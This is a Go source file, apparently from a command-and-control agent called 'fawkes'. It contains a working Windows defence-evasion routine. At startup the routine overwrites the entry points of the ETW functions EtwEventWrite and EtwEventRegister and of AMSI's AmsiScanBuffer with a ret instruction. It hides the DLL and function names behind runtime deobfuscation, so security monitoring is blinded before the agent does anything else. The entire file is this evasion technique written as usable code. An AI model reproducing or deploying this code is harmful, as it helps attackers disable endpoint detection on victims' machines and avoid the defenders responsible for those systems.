//go:build windows

package main

import (
	"fawkes/pkg/obfuscate"
	"syscall"
	"unsafe"
)

// autoStartupPatch patches ETW and AMSI functions at startup with a single
// 0xC3 (ret) instruction, causing them to return immediately.
// This prevents ETW-based detection and AMSI scanning before any agent activity.
func autoStartupPatch() {
	// Resolve DLL/proc names at runtime from encrypted table
	k32 := obfuscate.Kernel32Dll()
	defer obfuscate.Zero(k32)
	vpName := obfuscate.VirtualProtect()
	defer obfuscate.Zero(vpName)

	k32dll := syscall.NewLazyDLL(k32)
	vpProc := k32dll.NewProc(vpName)

	ntdll := obfuscate.NtdllDll()
	defer obfuscate.Zero(ntdll)
	amsi := obfuscate.AmsiDll()
	defer obfuscate.Zero(amsi)
	etwWrite := obfuscate.EtwEventWrite()
	defer obfuscate.Zero(etwWrite)
	etwReg := obfuscate.EtwEventRegister()
	defer obfuscate.Zero(etwReg)
	amsiScan := obfuscate.AmsiScanBuffer()
	defer obfuscate.Zero(amsiScan)

	// Patch ETW first — ntdll.dll is always loaded
	patchFunctionEntry(ntdll, etwWrite, vpProc)
	patchFunctionEntry(ntdll, etwReg, vpProc)
	// Patch AMSI — amsi.dll may not be loaded yet, but will be when CLR loads
	patchFunctionEntry(amsi, amsiScan, vpProc)
}

// patchFunctionEntry writes 0xC3 (ret) at the entry point of the specified function.
// Silently returns on any error (DLL not loaded, function not found, etc.).
func patchFunctionEntry(dllName, funcName string, vpProc *syscall.LazyProc) {
	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		return // DLL not loaded — nothing to patch
	}
	proc, err := dll.FindProc(funcName)
	if err != nil {
		return // Function not found
	}

	addr := proc.Addr()
	var oldProtect uint32
	ret, _, _ := vpProc.Call(addr, 1, 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return // VirtualProtect failed
	}

	*(*byte)(unsafe.Pointer(addr)) = 0xC3

	// Restore original protection
	vpProc.Call(addr, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}
